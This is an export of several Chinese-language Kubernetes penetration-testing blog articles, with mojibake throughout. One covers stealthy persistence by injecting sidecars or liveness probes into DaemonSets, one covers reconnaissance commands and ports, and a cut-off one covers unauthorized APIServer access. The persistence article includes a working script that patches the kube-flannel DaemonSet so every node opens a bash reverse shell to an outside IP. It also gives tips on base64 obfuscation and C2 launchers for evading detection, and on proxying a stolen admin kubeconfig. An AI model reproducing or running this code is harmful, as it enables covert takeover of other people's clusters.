\u0026#34;$pod\u0026#34; ]; then echo \u0026#34;No pod found for $ns/$name, skipping...\u0026#34; continue fi echo \u0026#34;Checking interpreters in $ns/$name ($pod):\u0026#34; for interpreter in sh bash python3 python node perl ruby; do kubectl exec -n $ns $pod -- which $interpreter \u0026amp;\u0026gt;/dev/null \u0026amp;\u0026amp; echo \u0026#34; $interpreter found\u0026#34; done done æ¯”å¦‚è¿™é‡Œé€šè¿‡ä¸Šé¢çš„è„šæœ¬å‘ç°ä¸¤ä¸ªæœ‰bashï¼Œæœ‰ä¸€ä¸ªç”šè‡³æœ‰perlï¼š ç”±äºkube-flannel/kube-flannel-dsæ›´ä¸ºå¸¸è§ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»è¿™ä¸ªpodä¸‹æ‰‹ï¼Œé¦–å…ˆæŸ¥çœ‹å…¶daemonsetçš„yamlçš„specå­—æ®µï¼š\nspec: revisionHistoryLimit: 10 selector: matchLabels: app: flannel template: metadata: creationTimestamp: null labels: app: flannel tier: node spec: affinity: nodeAffinity: requiredDuringSchedulingIgnoredDuringExecution: nodeSelectorTerms: - matchExpressions: - key: kubernetes.io/os operator: In values: - linux containers: - args: - --ip-masq - --kube-subnet-mgr command: - /opt/bin/flanneld env: - name: POD_NAME valueFrom: fieldRef: apiVersion: v1 fieldPath: metadata.name - name: POD_NAMESPACE valueFrom: fieldRef: apiVersion: v1 fieldPath: metadata.namespace - name: EVENT_QUEUE_DEPTH value: \u0026#34;5000\u0026#34; image: docker.io/flannel/flannel:v0.25.1 imagePullPolicy: IfNotPresent name: kube-flannel resources: requests: cpu: 100m memory: 50Mi securityContext: capabilities: add: - NET_ADMIN - NET_RAW privileged: false terminationMessagePath: /dev/termination-log terminationMessagePolicy: File volumeMounts: - mountPath: /run/flannel name: run - mountPath: /etc/kube-flannel/ name: flannel-cfg - mountPath: /run/xtables.lock name: xtables-lock dnsPolicy: ClusterFirst hostNetwork: true initContainers: - args: - -f - /flannel - /opt/cni/bin/flannel command: - cp image: docker.io/flannel/flannel-cni-plugin:v1.4.1-flannel1 imagePullPolicy: IfNotPresent name: install-cni-plugin resources: {} terminationMessagePath: /dev/termination-log terminationMessagePolicy: File volumeMounts: - mountPath: /opt/cni/bin name: cni-plugin - args: - -f - /etc/kube-flannel/cni-conf.json - /etc/cni/net.d/10-flannel.conflist command: - cp image: docker.io/flannel/flannel:v0.25.1 imagePullPolicy: IfNotPresent name: install-cni resources: {} terminationMessagePath: /dev/termination-log terminationMessagePolicy: File volumeMounts: - mountPath: /etc/cni/net.d name: cni - mountPath: /etc/kube-flannel/ name: flannel-cfg priorityClassName: system-node-critical restartPolicy: Always schedulerName: default-scheduler securityContext: {} serviceAccount: flannel serviceAccountName: flannel terminationGracePeriodSeconds: 30 tolerations: - effect: NoSchedule operator: Exists volumes: - hostPath: path: /run/flannel type: \u0026#34;\u0026#34; name: run - hostPath: path: /opt/cni/bin type: \u0026#34;\u0026#34; name: cni-plugin - hostPath: path: /etc/cni/net.d type: \u0026#34;\u0026#34; name: cni - configMap: defaultMode: 420 name: kube-flannel-cfg name: flannel-cfg - hostPath: path: /run/xtables.lock type: FileOrCreate name: xtables-lock updateStrategy: rollingUpdate: maxSurge: 0 maxUnavailable: 1 type: RollingUpdate ç»è¿‡åˆ†æå…¶yamlå¯ä»¥å¾—åˆ°æ³¨å…¥è„šæœ¬ï¼š\n#!/usr/bin/env bash # inject-flannel-probe.sh -- Insert malicious livenessProbe into kube-flannel DaemonSet (no temp files) # Usage: ./inj_probe.sh set -e # bash built-in TCP socket (zero external commands) PROBE_CMD=\u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/8.156.69.160/2333 0\u0026gt;\u0026amp;1\u0026#39; PROBE_BLOCK=\u0026#34;\\ livenessProbe:\\n\\ exec:\\n\\ command:\\n - /bin/bash\\n\\ - -c\\n\\ - \u0026#39;$PROBE_CMD\u0026#39;\\n\\ initialDelaySeconds: 30\\n\\ periodSeconds: 5\\n\\ failureThreshold: 2147483647\u0026#34; # ===== insert before first \u0026#34;volumeMounts:\u0026#34; in the first container ===== kubectl -n kube-flannel get ds kube-flannel-ds -o yaml \\ | awk -v pb=\u0026#34;$PROBE_BLOCK\u0026#34; \u0026#39; /^ [a-zA-Z].*:$/ \u0026amp;\u0026amp; !done \u0026amp;\u0026amp; $0 ~ /volumeMounts:/ { print pb; done=1 } { print } \u0026#39; \\ | kubectl apply -f - kubectl -n kube-flannel rollout status ds/kube-flannel-ds echo \u0026#34;[+] Done\u0026#34; ä¸Šé¢æ˜¯æ¼”ç¤ºè„šæœ¬ï¼Œå¦‚æœæƒ³è¦å¢åŠ éšè”½æ€§å’Œå¯ç”¨æ€§å¯ä»¥è€ƒè™‘ä¸‹é¢çš„å‡ ç‚¹ï¼š\nå°†å‘½ä»¤ç¼–ç ï¼Œæ¯”å¦‚å°†æ˜æ–‡çš„åå¼¹shellå‘½ä»¤æ”¹ä¸ºbase64è§£ç åæ‰§è¡Œçš„å‘½ä»¤ï¼Œé˜²æ­¢æŸ¥çœ‹yamlæ—¶è¢«ä¸€çœ¼æ’æŸ¥\nä¿®æ”¹å‚æ•°periodSeconds: 5ï¼Œè¿™é‡Œæ˜¯æ¯ 5 ç§’æ‰§è¡Œä¸€æ¬¡ï¼Œå¯ä»¥é€‚å½“å¢åŠ æ—¶é—´é—´éš”\nç”±äºæ˜¯æ‰€æœ‰èŠ‚ç‚¹çš„è¢«æ³¨å…¥podéƒ½ä¼šåå¼¹shellï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥è€ƒè™‘ä½¿ç”¨éƒ¨åˆ†c2çš„ä¸€é”®ä¸Šçº¿å‘½ä»¤å¢åŠ å¯ç”¨æ€§\nåœ¨masterèŠ‚ç‚¹è¿è¡Œè„šæœ¬å®ç°æ³¨å…¥ï¼š 5ç§’åç›‘å¬çš„vpsä¼šæ”¶åˆ°åå¼¹shellï¼š\nå¹¶ä¸”è¢«æ³¨å…¥podçš„å®¹å™¨æ•°ä¹Ÿä¸ä¼šæœ‰ä»»ä½•å˜åŒ–ï¼Œç›¸æ¯”sidecaræ›´åŠ éšè”½ï¼š\næ€è·¯ä¼˜åŒ– è™½ç„¶æˆ‘ä»¬åœ¨ä¸Šé¢å¯ä»¥å¾—åˆ°kube-flannelçš„podçš„shellï¼Œä½†å’Œsidecarä¸åŒï¼Œç”±äºè¿™ä¸ªå®¹å™¨ä¸æ˜¯æˆ‘ä»¬ä¸»åŠ¨åˆ›å»ºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½è‡ªä¸»çš„å»é™¤å®¹å™¨ä¸å®¿ä¸»æœºéš”ç¦»ï¼Œé‚£è¿™æ ·å°±æ˜¾å¾—å¾ˆé¸¡è‚‹äº†ï¼Œè¿æˆ‘ä»¬è¿nodeéƒ½æ‘¸ä¸åˆ°æœ‰å•¥ç”¨\næœ‰æ²¡æœ‰èƒ½å¤Ÿæé«˜å¯ç”¨æ€§çš„æ–¹æ³•å‘¢ï¼Œç¬”è€…åœ¨è¿™é‡ŒæŠ›ç –å¼•ç‰ï¼š\næˆ‘ä»¬åœ¨ç»´æŒçš„æ—¶å€™æ—¢ç„¶å·²ç»æ§åˆ¶äº†masterèŠ‚ç‚¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°†å…¶ä¸Šé¢çš„é«˜æƒé™kubeconfigæ–‡ä»¶ä¿å­˜ä¸‹æ¥ï¼š\nç”±äºå¾ˆå¤šæ—¶å€™è¿™ç§æ–‡ä»¶ä¸­è¯ä¹¦å…è®¸çš„apiserverçš„ipéƒ½æ˜¯å†…ç½‘IPï¼Œæ‰€ä»¥æ— æ³•ç›´æ¥è¿œç¨‹æ§åˆ¶apiserverï¼š\nè€Œæˆ‘ä»¬åˆç»´æŒäº†kube-flannelæ§åˆ¶çš„podçš„shellï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªshellåšä»£ç†:\næ­å»ºä»£ç†ä¹‹åå³å¯åœ¨æœ¬åœ°ä½¿ç”¨é«˜æƒé™kubeconfigæ–‡ä»¶æ¥è¿œç¨‹è°ƒç”¨apiserverï¼š\næ€»ç»“ æ€»çš„æ¥çœ‹ï¼ŒåŠ¨æ€å®¹å™¨æ³¨å…¥çš„æœ¬è´¨å°±æ˜¯é€šè¿‡ä¿®æ”¹daemonsetçš„yamlå®ç°æ–°å¢sidecarå®¹å™¨æˆ–å­˜æ´»æ¢é’ˆï¼Œæ¥å‘½ä»¤æ‰§è¡Œå®ç°æƒé™ç»´æŒ\nå½“ç„¶ï¼Œè¿™é‡Œä»…è®°å½•äº†ç¬”è€…èƒ½æƒ³åˆ°çš„trickï¼Œå¦‚æœæœ‰æ›´å¥½çš„åŠæ³•æ¬¢è¿åœ¨å¤§å®¶æå‡ºè®¨è®º\nå‚è€ƒï¼š\nã€Šk0otkit: Hack K8s in a K8s Wayã€‹ ã€ŠADCONF2025-äº‘åŸç”Ÿæ”»å‡»è·¯å¾„ã€‹ ",
        "summary": "åŠ¨æ€å®¹å™¨æ³¨å…¥-ä¸€ç§éšè”½çš„k8sæƒé™ç»´æŒæ–¹æ³• æ¶æ„pod-\u0026gt;åå¼¹shell-\u0026gt;æŒ‚è½½å®¿ä¸»æœº(node)/-\u0026gt;cronå†™å®šæ—¶ä»»åŠ¡åå¼¹shell-\u0026gt;master-node\nk8sæ§åˆ¶å™¨\nä¼—æ‰€å‘¨çŸ¥ï¼Œk8sçš„æŒä¹…åŒ–æœ‰å¾ˆå¤šæ–¹æ³•ï¼š\néƒ¨ç½²åé—¨pod éƒ¨ç½²cronjob éƒ¨ç½²shadowApiserver éƒ¨ç½²æ¶æ„deployment éƒ¨ç½²æ¶æ„deamonset è¿™äº›æ–¹æ³•å¤§å®¶æƒ³å¿…éƒ½å¾ˆç†Ÿæ‚‰äº†ï¼Œè€Œè¿™äº›æ–¹æ³•éƒ½éœ€è¦æˆ‘ä»¬é¢å¤–åˆ›å»ºæ–°çš„podæˆ–è€…k8sæ§åˆ¶å™¨ï¼Œk8sä¸­å¤šå‡ºæ¥ä¸€äº›podå’Œæ§åˆ¶å™¨å¾ˆå®¹æ˜“å°±è¢«å‘ç°äº†ï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆèƒ½å¤Ÿåˆ©ç”¨åŸæœ‰æ§åˆ¶å™¨å’Œpodçš„åŠæ³•å‘¢ï¼Ÿ\nè¿™é‡Œå°±æœ‰ä¸€ç§å«åšåŠ¨æ€å®¹å™¨æ³¨å…¥çš„æ–¹å¼\nç›®å‰æ¥è¯´çš„æ³¨å…¥æ–¹å¼æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯å°†ä¸€ä¸ªsidecarå®¹å™¨æ³¨å…¥åˆ°åŸæœ‰podä¸­ï¼Œä¸€ç§æ˜¯å°†å­˜æ´»æ¢é’ˆæ³¨å…¥åˆ°åŸæœ‰podä¸­\nåˆ©ç”¨sidecarå®¹å™¨æŠ€æœ¯è¿›è¡Œæ³¨å…¥ è¿™é‡Œæåˆ°ä¸€ä¸ªæŠ€æœ¯å«sidecarï¼Œç®€å•ç†è§£å°±æ˜¯åœ¨åŒä¸€ä¸ª Pod é‡Œé¢å¤–æ”¾ä¸€åªå®¹å™¨ï¼Œä¸ºä¸»ä¸šåŠ¡å®¹å™¨æä¾›å¢å¼ºèƒ½åŠ›ï¼Œç”Ÿå‘½å‘¨æœŸä¸ä¸»å®¹å™¨å®Œå…¨ä¸€è‡´ï¼ˆåŒå¯ã€åŒåœã€åŒç½‘ç»œã€åŒå­˜å‚¨å·ï¼‰ã€‚å…·ä½“æŠ€æœ¯ç”¨é€”å¯ä»¥åœ¨å®˜æ–¹æ–‡æ¡£äº†è§£ï¼šhttps://kubernetes.io/zh-cn/docs/concepts/workloads/pods/sidecar-containers/\nè¿™é‡Œå¯ä»¥åˆ©ç”¨k8sæ§åˆ¶å™¨ï¼Œåƒdaemonsetè¿™ç±»ï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ”¹å®ƒyamlçš„spec.templateçš„å†…å®¹ï¼Œå¹¶replaceè§¦å‘å…¶æ›´æ–°ï¼Œè¿™æ ·å°±èƒ½å®ç°åœ¨åŸå®¹å™¨ä¸Šå¢åŠ ä¸€ä¸ªæ¶æ„çš„sidecarå®¹å™¨ï¼Œè€Œä¸ç”¨å¢åŠ ä¸€ä¸ªæ–°çš„æ§åˆ¶å™¨æˆ–ç‹¬ç«‹pod\nä¸ºä»€ä¹ˆé€‰æ‹©daemonsetï¼š\nå®ƒèƒ½å¤Ÿç¡®ä¿æ‰€æœ‰èŠ‚ç‚¹ï¼ˆåŒ…æ‹¬æ–°å¢èŠ‚ç‚¹ï¼‰ä¸Šéƒ½è¿è¡Œä¸€ä¸ªPod\nå¦‚æœæœ‰Podé€€å‡ºï¼ŒDaemonSetå°†åœ¨å¯¹åº”èŠ‚ç‚¹ä¸Šè‡ªåŠ¨é‡å»ºä¸€ä¸ªPod\nå€¼å¾—ä¸€é¢˜çš„æ˜¯ï¼Œæˆ‘ä»¬æ³¨å…¥çš„æ¶æ„å®¹å™¨éœ€è¦æ€ä¹ˆé…ç½®æ¯”è¾ƒå¥½å‘¢ï¼Œæ€è·¯å¯ä»¥ä»å»é™¤å®¹å™¨ä¸å®¿ä¸»æœºéš”ç¦»çš„è§’åº¦å‡ºå‘ï¼š\nå®¹å™¨æ˜¯ç‰¹æƒçš„ï¼ˆç›¸å½“äºdocker runçš„æ—¶å€™å¸¦äº†â€“privilegedé€‰é¡¹ï¼‰\nå®¹å™¨ä¸å®¿ä¸»æœºå…±äº«ç½‘ç»œå’ŒPIDå‘½åç©ºé—´ï¼ˆæ‰“ç ´å‘½åç©ºé—´éš”ç¦»ï¼‰\nå®¹å™¨å†…æŒ‚è½½å®¿ä¸»æœºæ ¹ç›®å½•ï¼ˆæ‰“ç ´æ–‡ä»¶ç³»ç»Ÿéš”ç¦»ï¼‰\nè¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬è·å¾—sidecarå®¹å™¨çš„shellå®é™…ä¸Šå’ŒèŠ‚ç‚¹çš„shellåŒºåˆ«å°±ä¸å¤§äº†\nåŸºç¡€æ³¨å…¥ ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬ä¼šè€ƒè™‘å¯¹kube-systemå‘½åç©ºé—´ä¸­å·²è¿è¡Œçš„daemonsetè¿›è¡Œæ³¨å…¥ï¼Œå¸¸ç”¨çš„æ˜¯k8sä¸­çš„kube-proxyï¼Œæ¯”å¦‚æ¥ä¸‹æ¥è¿™ä¸ªä¾‹å­ï¼š\næˆ‘ä»¬æ¢æµ‹ä¸€ä¸‹æ˜¯å¦å­˜åœ¨kube-proxyï¼š\nkubectl get daemonset -n kube-system æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°è¿™ä¸ªdaemonsetæ§åˆ¶çš„podï¼š\næ¥ä¸‹æ¥æˆ‘ä»¬æ¥è¯»è¿™ä¸ªdaemonsetçš„yamlï¼š\nkubectl get daemonset -n kube-system -o yaml æˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªyamlåŸºç¡€ä¸Šè¿›è¡Œä¿®æ”¹å®ç°æ³¨å…¥ï¼š\næˆ‘ä»¬å…ˆåˆ†æåŸyamlçš„specï¼š\nspec: revisionHistoryLimit: 10 selector: matchLabels: k8s-app: kube-proxy template: metadata: creationTimestamp: null labels: k8s-app: kube-proxy spec: containers: - command: - /usr/local/bin/kube-proxy - --config=/var/lib/kube-proxy/config.conf - --hostname-override=$(NODE_NAME) env: - name: NODE_NAME valueFrom: fieldRef: apiVersion: v1 fieldPath: spec.nodeName image: registry.k8s.io/kube-proxy:v1.30.14 imagePullPolicy: IfNotPresent name: kube-proxy resources: {} securityContext: privileged: true terminationMessagePath: /dev/termination-log terminationMessagePolicy: File volumeMounts: - mountPath: /var/lib/kube-proxy name: kube-proxy - mountPath: /run/xtables.lock name: xtables-lock - mountPath: /lib/modules name: lib-modules readOnly: true dnsPolicy: ClusterFirst hostNetwork: true nodeSelector: kubernetes.io/os: linux priorityClassName: system-node-critical restartPolicy: Always schedulerName: default-scheduler securityContext: {} serviceAccount: kube-proxy serviceAccountName: kube-proxy terminationGracePeriodSeconds: 30 tolerations: - operator: Exists volumes: - configMap: defaultMode: 420 name: kube-proxy name: kube-proxy - hostPath: path: /run/xtables.lock type: FileOrCreate name: xtables-lock - hostPath: path: /lib/modules type: \u0026#34;\u0026#34; name: lib-modules updateStrategy: rollingUpdate: maxSurge: 0 maxUnavailable: 1 type: RollingUpdate æˆ‘ä»¬åªéœ€è¦åœ¨æ­¤åŸºç¡€ä¸Šå¢åŠ ä¸¤ä¸ªæ–°å¯¹è±¡ï¼š\n"
    }
,
    {
        "title": "K8sæ¸—é€-ä¿¡æ¯æœé›†",
        "link": "/My-Knowlege-Database/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/",
        "content": "K8sæ¸—é€-ä¿¡æ¯æœé›† æ–‡ç« é¦–å‘äºtrackå®‰å…¨ç¤¾åŒºï¼šK8sæ¸—é€å…¥é—¨ä»é›¶åˆ°ä¸€\nè¿™ä¸€æ­¥å‘ç”Ÿåœ¨å†…ç½‘ä¿¡æ¯æœé›†çš„è¿‡ç¨‹ä¸­ï¼Œå†…ç½‘ä¸€èˆ¬ä¸ä¼šå®Œå…¨åŸºäºå®¹å™¨æŠ€æœ¯æ„å»ºï¼Œæ‰€ä»¥å†…ç½‘æœé›†çš„èµ·ç‚¹ä¸€èˆ¬å¯ä»¥åˆ†ä¸ºæƒé™å—é™çš„ä¸»æœºå’Œç‰©ç†ä¸»æœºå†…ç½‘\nk8så†…éƒ¨é›†ç¾¤ç½‘ç»œä¸»è¦ä¾é ç½‘ç»œæ’ä»¶ï¼Œç›®å‰ä½¿ç”¨æ¯”è¾ƒå¤šçš„æ˜¯Flannelå’ŒCalico\nè€Œé€šä¿¡ç±»å‹å­˜åœ¨4ç§ï¼š\nåŒä¸€podå†…çš„å®¹å™¨é—´é€šä¿¡ ä¸åŒpodé—´çš„é€šä¿¡ podä¸serviceé—´çš„é€šä¿¡ é›†ç¾¤å¤–éƒ¨çš„æµé‡ä¸serviceé—´çš„é€šä¿¡ shellç¯å¢ƒè¾¨åˆ« å¦‚æœæˆ‘ä»¬çš„èµ·ç‚¹æ˜¯ä¸€ä¸ªåœ¨k8sé›†ç¾¤å†…éƒ¨æƒé™å—é™çš„å®¹å™¨ï¼Œé‚£ä¹ˆå†…ç½‘æ¢æµ‹çš„è¿‡ç¨‹ä¾ç„¶éµå¾ªå¸¸è§„å†…ç½‘æ¢æµ‹ï¼Œå¯ä»¥å…ˆåœ¨æœé›†çš„æ—¶å€™åˆ¤æ–­å½“å‰æ˜¯å¦æ˜¯äº‘ç¯å¢ƒï¼Œå¯ä»¥å‚è€ƒæˆ‘çš„ç¬”è®°ï¼šå¿«é€Ÿè¯†åˆ«è™šæ‹Ÿä¸»æœºã€Dockerå’ŒK8sé›†ç¾¤ç¯å¢ƒ\nä¸€äº›å¸¸ç”¨å‘½ä»¤ï¼š\nps aux ls -l .dockerenv capsh --print env | grep KUBE ls -l /run/secrets/kubernetes.io/ mount df -h cat /proc/1/cgroup cat /etc/resolv.conf cat /etc/mtab cat /proc/self/status cat /proc/self/mounts cat /proc/net/unix cat /proc/1/mountinfo è¿™é‡Œçš„cat /proc/1/cgroupæ˜¯åˆ†è¾¨å®¹å™¨ç¯å¢ƒä¸€ä¸ªå¾ˆå®ç”¨çš„å‘½ä»¤ï¼š\næ²¡ä½¿ç”¨ Kubernetes çš„ docker å®¹å™¨ï¼Œå…¶ cgroup ä¿¡æ¯æ ¼å¼å¦‚ä¸‹ï¼š\n12:hugetlb:/docker/9df9278580c5fc365cb5b5ee9430acc846cf6e3207df1b02b9e35dec85e86c36 è€Œk8sé»˜è®¤çš„cgroupä¿¡æ¯æ ¼å¼å¦‚ä¸‹ï¼š\n12:hugetlb:/kubepods/burstable/pod45226403-64fe-428d-a419-1cc1863c9148/e8fb379159f2836dbf990915511a398a0c6f7be1203e60135f1cbdc31b97c197 ç‰¹æƒç›¸å…³æœé›† å¦å¤–capsh --printè·å–åˆ°ä¿¡æ¯ä¹Ÿè¾ƒä¸ºé‡è¦ï¼Œå¯ä»¥æ‰“å°å‡ºå½“å‰å®¹å™¨é‡Œå·²æœ‰çš„ Capabilities æƒé™ï¼š é‚£å¦‚æœæ²¡æœ‰capshå‘½ä»¤ä¸”æ— æ³•å®‰è£…æ€ä¹ˆåŠå‘¢ï¼Ÿ\né¦–å…ˆcat /proc/1/status è·å–åˆ° Capabilities hex è®°å½•:\nç„¶ååœ¨æˆ‘ä»¬è‡ªå·±å®‰è£…äº†capshçš„ä¸»æœºä¸Šè¿›è¡Œdecodeï¼š\nå¦‚æ­¤å³å¯è¾¾åˆ°ä»£æ›¿capsh --printçš„æ•ˆæœ\nAPIServerç›¸å…³ æœ‰æ—¶å€™è™½ç„¶è·å¾—äº†å¯ä»¥è®¿é—® APIServer çš„ç½‘ç»œæƒé™å’Œè¯ä¹¦ï¼ˆåˆæˆ–è€…ä¸éœ€è¦è¯ä¹¦ï¼‰æ‹¥æœ‰äº†æ§åˆ¶é›†ç¾¤èµ„æºçš„æƒé™ï¼Œå´æ— æ³•ä¸‹è½½æˆ–å®‰è£…ä¸€ä¸ª kubectl ç¨‹åºä¾¿æ·çš„å’Œ APIServer é€šä¿¡ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥é…ç½® kubectl çš„ logging ç™»è®°ï¼Œè®°å½•æœ¬åœ° kubectl å’Œæµ‹è¯• APIServer çš„è¯·æ±‚è¯¦æƒ…ï¼Œå¹¶å°†ç›¸åŒçš„è¯·æ±‚åŒ…å‘é€ç»™ç›®æ ‡çš„ APIServer ä»¥å®ç°ç›¸åŒçš„æ•ˆæœ\nkubectl create -f cronjob.yaml -v=8 å¦‚æœéœ€è¦æ›´è¯¦ç»†çš„ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥æé«˜ logging level, ä¾‹å¦‚ kubectl -v=10 ç­‰ï¼Œå…¶ä»– Kubernetes ç»„ä»¶ä¹Ÿèƒ½è¾¾åˆ°ç›¸åŒçš„ç›®çš„\nç«¯å£ç›¸å…³æœé›† åœ¨å†…ç½‘ä¿¡æ¯æœé›†æ—¶ï¼Œè¿˜å¯ä»¥ç•™æ„ä¸€äº›k8sç›¸å…³ç«¯å£ï¼š\nkube-apiserver: 6443, 8080 kubectl proxy: 8080, 8081 kubelet: 10250, 10255, 4149 dashboard: 30000 docker api: 2375 etcd: 2379, 2380 kube-controller-manager: 10252 kube-proxy: 10256, 31442 kube-scheduler: 10251 weave: 6781, 6782, 6783 kubeflow-dashboard: 8080 ",
        "summary": "K8sæ¸—é€-ä¿¡æ¯æœé›† æ–‡ç« é¦–å‘äºtrackå®‰å…¨ç¤¾åŒºï¼šK8sæ¸—é€å…¥é—¨ä»é›¶åˆ°ä¸€\nè¿™ä¸€æ­¥å‘ç”Ÿåœ¨å†…ç½‘ä¿¡æ¯æœé›†çš„è¿‡ç¨‹ä¸­ï¼Œå†…ç½‘ä¸€èˆ¬ä¸ä¼šå®Œå…¨åŸºäºå®¹å™¨æŠ€æœ¯æ„å»ºï¼Œæ‰€ä»¥å†…ç½‘æœé›†çš„èµ·ç‚¹ä¸€èˆ¬å¯ä»¥åˆ†ä¸ºæƒé™å—é™çš„ä¸»æœºå’Œç‰©ç†ä¸»æœºå†…ç½‘\nk8så†…éƒ¨é›†ç¾¤ç½‘ç»œä¸»è¦ä¾é ç½‘ç»œæ’ä»¶ï¼Œç›®å‰ä½¿ç”¨æ¯”è¾ƒå¤šçš„æ˜¯Flannelå’ŒCalico\nè€Œé€šä¿¡ç±»å‹å­˜åœ¨4ç§ï¼š\nåŒä¸€podå†…çš„å®¹å™¨é—´é€šä¿¡ ä¸åŒpodé—´çš„é€šä¿¡ podä¸serviceé—´çš„é€šä¿¡ é›†ç¾¤å¤–éƒ¨çš„æµé‡ä¸serviceé—´çš„é€šä¿¡ shellç¯å¢ƒè¾¨åˆ« å¦‚æœæˆ‘ä»¬çš„èµ·ç‚¹æ˜¯ä¸€ä¸ªåœ¨k8sé›†ç¾¤å†…éƒ¨æƒé™å—é™çš„å®¹å™¨ï¼Œé‚£ä¹ˆå†…ç½‘æ¢æµ‹çš„è¿‡ç¨‹ä¾ç„¶éµå¾ªå¸¸è§„å†…ç½‘æ¢æµ‹ï¼Œå¯ä»¥å…ˆåœ¨æœé›†çš„æ—¶å€™åˆ¤æ–­å½“å‰æ˜¯å¦æ˜¯äº‘ç¯å¢ƒï¼Œå¯ä»¥å‚è€ƒæˆ‘çš„ç¬”è®°ï¼šå¿«é€Ÿè¯†åˆ«è™šæ‹Ÿä¸»æœºã€Dockerå’ŒK8sé›†ç¾¤ç¯å¢ƒ\nä¸€äº›å¸¸ç”¨å‘½ä»¤ï¼š\nps aux ls -l .dockerenv capsh --print env | grep KUBE ls -l /run/secrets/kubernetes.io/ mount df -h cat /proc/1/cgroup cat /etc/resolv.conf cat /etc/mtab cat /proc/self/status cat /proc/self/mounts cat /proc/net/unix cat /proc/1/mountinfo è¿™é‡Œçš„cat /proc/1/cgroupæ˜¯åˆ†è¾¨å®¹å™¨ç¯å¢ƒä¸€ä¸ªå¾ˆå®ç”¨çš„å‘½ä»¤ï¼š\næ²¡ä½¿ç”¨ Kubernetes çš„ docker å®¹å™¨ï¼Œå…¶ cgroup ä¿¡æ¯æ ¼å¼å¦‚ä¸‹ï¼š\n12:hugetlb:/docker/9df9278580c5fc365cb5b5ee9430acc846cf6e3207df1b02b9e35dec85e86c36 è€Œk8sé»˜è®¤çš„cgroupä¿¡æ¯æ ¼å¼å¦‚ä¸‹ï¼š\n12:hugetlb:/kubepods/burstable/pod45226403-64fe-428d-a419-1cc1863c9148/e8fb379159f2836dbf990915511a398a0c6f7be1203e60135f1cbdc31b97c197 ç‰¹æƒç›¸å…³æœé›† å¦å¤–capsh --printè·å–åˆ°ä¿¡æ¯ä¹Ÿè¾ƒä¸ºé‡è¦ï¼Œå¯ä»¥æ‰“å°å‡ºå½“å‰å®¹å™¨é‡Œå·²æœ‰çš„ Capabilities æƒé™ï¼š é‚£å¦‚æœæ²¡æœ‰capshå‘½ä»¤ä¸”æ— æ³•å®‰è£…æ€ä¹ˆåŠå‘¢ï¼Ÿ\né¦–å…ˆcat /proc/1/status è·å–åˆ° Capabilities hex è®°å½•:\nç„¶ååœ¨æˆ‘ä»¬è‡ªå·±å®‰è£…äº†capshçš„ä¸»æœºä¸Šè¿›è¡Œdecodeï¼š\nå¦‚æ­¤å³å¯è¾¾åˆ°ä»£æ›¿capsh --printçš„æ•ˆæœ\n"
    }
,
    {
        "title": "K8sæ¸—é€-åˆå§‹è®¿é—®",
        "link": "/My-Knowlege-Database/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/",
        "content": "K8sæ¸—é€-åˆå§‹è®¿é—® æ–‡ç« é¦–å‘äºtrackå®‰å…¨ç¤¾åŒºï¼šK8sæ¸—é€å…¥é—¨ä»é›¶åˆ°ä¸€\nåˆå§‹è®¿é—®æ˜¯æ”»é˜²çŸ©é˜µçš„ç¬¬ä¸€æ­¥ï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºè·å–å¯¹k8sçš„è®¿é—®æƒé™\nAPIServeræœªæˆæƒ insecure-portå¼€å¯ å…¸ä¸­å…¸çš„k8sç›¸å…³æ¼æ´ï¼ŒAPIServeråœ¨é›†ç¾¤ä¸­è¢«ç”¨äºæä¾›APIæ¥æ§åˆ¶é›†ç¾¤å†…éƒ¨ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶API Serverï¼Œå°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥é€šè¿‡å®ƒåˆ©ç”¨kubectlåˆ›å»ºPodå¹¶ä½¿ç”¨ç£ç›˜æŒ‚è½½æŠ€æœ¯è·å–NodeèŠ‚ç‚¹æ§åˆ¶æƒ\nå¦‚æœç›®æ ‡ä¸»æœºå°†APISevreréå®‰å…¨ç«¯å£8080æš´éœ²å‡ºæ¥ï¼Œä¾¿å¯ä»¥åˆ©ç”¨æ­¤ç«¯å£è¿›è¡Œå¯¹é›†ç¾¤çš„æ”»å‡»ï¼š\nç›´æ¥è®¿é—®8080ç«¯å£ï¼Œä¼šè¿”å›å¯ç”¨çš„APIåˆ—è¡¨ï¼š\næ¥ä¸‹æ¥éœ€è¦ç”¨åˆ°kubectlï¼Œå®‰è£…æ•™ç¨‹è§å®˜ç½‘\nä½¿ç”¨kubectlå¯ä»¥è·å–é›†ç¾¤ä¿¡æ¯ï¼š\nkubectl -s [ip]:[port] get nodes ä¸Šé¢è¿™ä¸ªæ¡ˆä¾‹å¯ä»¥çœ‹åˆ°æœ‰4ä¸ªèŠ‚ç‚¹ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªèŠ‚ç‚¹statusä¸ºreadyï¼Œå¯ä»¥æˆä¸ºåç»­æ‰§è¡Œé˜¶æ®µçš„å…¥å£ç‚¹ï¼Œæ¯”å¦‚åˆ©ç”¨kubectlè°ƒç”¨è¯¥apiserveræ¥åˆ›å»ºæ¶æ„pod\nsecure-portå¼€å¯åŒ¿åè®¿é—® 